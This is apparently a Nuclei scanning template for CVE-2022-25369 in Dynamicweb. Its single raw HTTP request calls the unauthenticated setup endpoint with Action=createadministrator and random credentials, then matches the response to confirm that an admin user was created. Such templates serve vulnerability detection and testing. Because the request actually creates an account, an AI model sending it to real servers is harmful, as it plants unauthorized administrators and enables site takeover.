id: cve-2022-25369
info:
  name: Dynamicweb Unauthenticated Admin User Creation
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Dynamicweb versions 9.5.0 to 9.12.7 allow unauthenticated attackers to create an admin user by exploiting a vulnerability in the Default.aspx endpoint.
  reference:
    - https://blog.assetnote.io/2022/02/20/dynamicweb-advisory/
    - https://www.dynamicweb.com
  classification:
    cve-id: CVE-2022-25369
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8

variables:
  admin_username: "{{rand_text_alphanumeric(8)}}"
  admin_password: "{{rand_text_alphanumeric(12)}}"
  admin_name: "{{rand_text_alphanumeric(8)}}"
  admin_email: "{{rand_text_alphanumeric(8)}}@example.com"

http:
  - raw:
      - |
        GET /Admin/Access/Setup/Default.aspx?Action=createadministrator&adminusername={{admin_username}}&adminpassword={{admin_password}}&adminemail={{admin_email}}&adminname={{admin_name}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "true"
        part: body

    extractors:
      - type: regex
        group: 1
        internal: true
        regex:
          - "admincreated:\"([a-zA-Z0-9_.-]+)\""
